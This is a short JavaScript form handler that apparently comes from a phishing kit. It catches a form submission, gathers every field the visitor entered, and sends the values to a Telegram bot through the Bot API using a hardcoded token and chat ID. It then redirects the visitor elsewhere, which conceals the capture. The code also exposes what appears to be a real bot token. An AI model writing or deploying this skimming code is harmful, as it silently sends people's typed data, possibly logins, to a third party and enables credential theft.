document.getElementById("telegram").addEventListener("submit", function(event) {
  event.preventDefault(); // Prevent the form from submitting normally

  // Get the form data
  var formData = new FormData(this);
  var message = "";

  // Construct the message
  for (var pair of formData.entries()) {
    message += pair[0] + ": `" + pair[1] + "`\n";
  }

  // Your Telegram bot API token
  var token = "6331823095:AAGCI0yP2ZXroAUMtassDfqmnkrJIMp908I";

  // Your Telegram chat ID
  var chatId = "6711432012";

  // Get the redirect link from the form's data attribute
  var redirectLink = this.getAttribute('data-redirect');

  // Construct the URL for sending the message to Telegram
  var url = "https://api.telegram.org/bot" + token + "/sendMessage";

  // Data to be sent
  var data = {
    chat_id: chatId,
    text: message,
    parse_mode: 'Markdown'
  };

  // Send the message using AJAX
  var xhr = new XMLHttpRequest();
  xhr.open("POST", url, true);
  xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
      // Redirect to the specified link after form submission
      window.location.href = redirectLink;
    }
  };
  xhr.send(JSON.stringify(data));
});
